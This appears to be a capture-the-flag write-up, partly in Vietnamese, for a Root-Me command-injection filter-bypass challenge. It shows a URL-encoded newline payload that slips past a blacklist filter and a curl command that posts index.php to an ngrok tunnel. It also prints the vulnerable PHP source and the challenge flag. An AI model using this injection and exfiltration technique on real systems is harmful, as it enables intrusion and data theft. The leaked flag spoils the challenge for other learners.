# [Command injection - Filter bypass](https://www.root-me.org/en/Challenges/Web-Server/Command-injection-Filter-bypass)

## Solution

Test:

- 127.0.0.1: ok
- 127.0.0.1;ls: error
- 127.0.0.1%0Als: ok

Tuy nhiên web chỉ hiển thị phản hồi là ok, không có kết quả câu lệnh ping hay là ls. => Cần thực thi câu lệnh để gửi kết quả đến một nơi khác.

- Sử dụng ngrok để tạo nơi đợi phản hồi: `https://d578-58-187-92-48.ap.ngrok.io/`
- Sử dụng curl command để gửi dữ liệu: curl -X POST -d @index.php `https://d578-58-187-92-48.ap.ngrok.io/`

=> Lấy được nội dung file `index.php`:

```html
<html><head><title>Ping Service</title></head><body><form method="POST" action="index.php">        <input type="text" name="ip" placeholder="127.0.0.1">        <input type="submit"></form><pre><?php $flag = "".file_get_contents(".passwd")."";if(isset($_POST["ip"]) && !empty($_POST["ip"])){        $ip = @preg_replace("/[\\\$|`;&<>]/", "", $_POST["ip"]); //$ip = @str_replace(['\\', '$', '|', '`', ';', '&', '<', '>'], "", $_POST["ip"]);        $response = @shell_exec("timeout 5 bash -c 'ping -c 3 ".$ip."'");        $receive = @preg_match("/3 packets transmitted, (.*) received/s",$response,$out);        if ($out[1]=="3")         {                echo "Ping OK";        }        elseif ($out[1]=="0")        {                echo "Ping NOK";        }        else        {                echo "Syntax Error";        }}?></pre></body></html>
```

Thấy flag ở file .passwd, tương tự như trên, lấy được nội dung file .passwd: `Comma@nd_1nJec7ion_Fl@9_1337_Th3_G@m3!!!`
